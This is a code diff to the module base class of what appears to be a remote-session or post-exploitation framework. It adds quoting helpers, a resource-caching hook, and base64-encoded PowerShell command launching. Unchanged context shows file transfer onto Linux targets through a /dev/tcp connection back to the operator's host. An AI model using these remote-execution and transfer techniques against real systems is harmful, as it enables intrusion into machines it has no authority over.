@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import base64
 import functools
 import inspect
 import re
@@ -205,6 +206,16 @@ class KoiModule(ABC):
     def _clean(text: str) -> str:
         return _ANSI_RE.sub("", text).strip()
 
+    @staticmethod
+    def _shell_quote(path: str) -> str:
+        """Quote *path* for safe insertion into a POSIX shell command."""
+        return shlex.quote(path)
+
+    @staticmethod
+    def _ps_quote(path: str) -> str:
+        """Escape *path* for a single-quoted PowerShell string literal."""
+        return path.replace("'", "''")
+
     @classmethod
     def supports(cls, os_type: Optional[str]) -> bool:
         """Return True if this module is compatible with the given session OS type."""
@@ -215,6 +226,19 @@ class KoiModule(ABC):
         if isinstance(cls.platform, list):
             return os_type in cls.platform
         return cls.platform == os_type
+
+    @classmethod
+    def resolve_external_resources(cls) -> list[dict]:
+        """Return the resources ``--local-prepare`` should cache for this module.
+
+        Defaults to the static :attr:`external_resources` list. Override it when
+        the set is only known at prep time, e.g. a module that always fetches the
+        latest upstream release: the override resolves the version now and lists
+        every asset variant, each under the exact ``cache_key`` the module will
+        look up at run time so the offline path actually hits the cache. Called
+        only by ``--local-prepare`` (online), so a network call here is fine.
+        """
+        return list(cls.external_resources or [])
 
     def __init__(
         self,
@@ -289,8 +313,13 @@ class KoiModule(ABC):
             # produce pipeline output correctly without it.
             cmd = f"{ps_expr}; '{marker}'"
         else:
+            # windows_cmd: launch PowerShell from cmd.exe. ps_expr routinely
+            # contains double quotes, which would collide with -c "..." and
+            # truncate the command. Encode it (base64 of UTF-16LE) so no quoting
+            # can break it, the same technique the ConPtyShell upgrade uses.
             inner = f"{ps_expr}; '{marker}'"
-            cmd = f'powershell -NoProfile -NonInteractive -c "{inner}"'
+            encoded = base64.b64encode(inner.encode("utf-16-le")).decode("ascii")
+            cmd = f"powershell -NoProfile -NonInteractive -EncodedCommand {encoded}"
 
         eol = self.session.eol
         enc = self.session.encoding
@@ -411,7 +440,7 @@ class KoiModule(ABC):
     ) -> bool:
         """Transfer *raw* bytes to *dest* on a Linux target via /dev/tcp."""
         local_ip = self._get_local_ip()
-        quoted = shlex.quote(dest)
+        quoted = self._shell_quote(dest)
         port, thread, errors = spawn_send_server(raw, timeout=timeout, on_progress=on_progress)
         result = self.exec(f"cat < /dev/tcp/{local_ip}/{port} > {quoted}", timeout=timeout)
         thread.join(timeout=timeout)
@@ -441,7 +470,7 @@ class KoiModule(ABC):
         failure instead of a false success.
         """
         local_ip = self._get_local_ip()
-        ps_dest = dest.replace("'", "''")
+        ps_dest = self._ps_quote(dest)
         resolved = (
             "$ExecutionContext.SessionState.Path."
             f"GetUnresolvedProviderPathFromPSPath('{ps_dest}')"
